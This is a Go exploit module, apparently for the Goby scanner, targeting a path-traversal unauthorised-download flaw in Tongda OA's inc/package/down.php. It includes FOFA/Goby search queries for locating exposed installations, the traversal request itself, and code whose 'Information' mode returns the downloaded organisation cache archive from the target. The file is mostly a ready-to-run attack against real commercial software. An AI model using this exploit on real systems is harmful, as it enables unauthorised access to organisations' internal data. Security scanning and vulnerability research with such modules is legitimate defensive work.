package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "tongda-OA inc/package/down.php Unauthorized Access Vulnerability",
    "Description": "<p>Attackers can control the entire system through unauthorized access vulnerabilities, and ultimately lead to an extremely insecure state of the system.</p>",
    "Product": "Tongda-OA",
    "Homepage": "https://www.tongda2000.com/",
    "DisclosureDate": "2024-08-02",
    "PostTime": "2024-08-06",
    "Author": "zhengwenjing@baimaohui.net",
    "FofaQuery": "body=\"通达\" && body=\"账号登录\"",
    "GobyQuery": "body=\"通达\" && body=\"账号登录\"",
    "Level": "1",
    "Impact": "<p>Attackers can control the entire system through unauthorized access vulnerabilities, and ultimately lead to an extremely insecure state of the system.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p> 2. Set access policies and whitelist access through security devices such as firewalls. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "Default,Information",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/inc/package/down.php?id=../../../cache/org",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|regex|{{{fixedhostinfo}}}/inc/package/down.php?id=../../../cache/org"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/inc/package/down.php?id=../../../cache/org",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access",
        "2H1W"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.4",
    "Translation": {
        "CN": {
            "Name": "通达-OA inc/package/down.php 未授权访问漏洞",
            "Product": "通达-OA",
            "Description": "<p>攻击者可通过未授权访问漏洞控制整个系统，最终导致系统处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本。</p><p>&nbsp;2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>&nbsp;3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过未授权访问漏洞控制整个系统，最终导致系统处于极度不安全状态。<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "tongda-OA inc/package/down.php Unauthorized Access Vulnerability",
            "Product": "Tongda-OA",
            "Description": "<p>Attackers can control the entire system through unauthorized access vulnerabilities, and ultimately lead to an extremely insecure state of the system.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p>&nbsp;2. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Attackers can control the entire system through unauthorized access vulnerabilities, and ultimately lead to an extremely insecure state of the system.<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9950"
}`

	postOrGet_jwieuh := func(hostInfo *httpclient.FixUrl, filePath string) (*httpclient.HttpResponse, error) {
		// GET请求
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 12
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		// URL路径
		url := `/inc/package/down.php?id=../../../cache/org`
		resp, err := setGetRequest(hostInfo, url, map[string]string{})

		if err != nil {
			return nil, err
		}
		if resp.StatusCode != 200 {
			return nil, errors.New("not response 200")
		}
		if !strings.Contains(resp.Utf8Html, "PK") || !strings.Contains(resp.Utf8Html, "org.xml") {
			return nil, errors.New("禁止访问")
		}
		return resp, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			filepath := "/inc/package/down.php?id=../../../cache/org"
			_, err := postOrGet_jwieuh(u, filepath)
			if err != nil {
				return false
			}
			ss.VulURL = u.FixedHostInfo + filepath
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := ss.Params["attackType"].(string)
			filepath := "/inc/package/down.php?id=../../../cache/org"
			resp, err := postOrGet_jwieuh(expResult.HostInfo, filepath)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			if attackType == "Default" {
				expResult.Success = true
				expResult.Output = "存在未授权下载，请根据以下数据包未授权下载\r\nGET /inc/package/down.php?id=../../../cache/org HTTP/1.1\r\nHost: " + expResult.HostInfo.FixedHostInfo + "\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\n"
				return expResult
			} else if attackType == "Information" {
				expResult.Success = true
				expResult.Output = resp.RawBody
			}
			return expResult
		},
	))
}
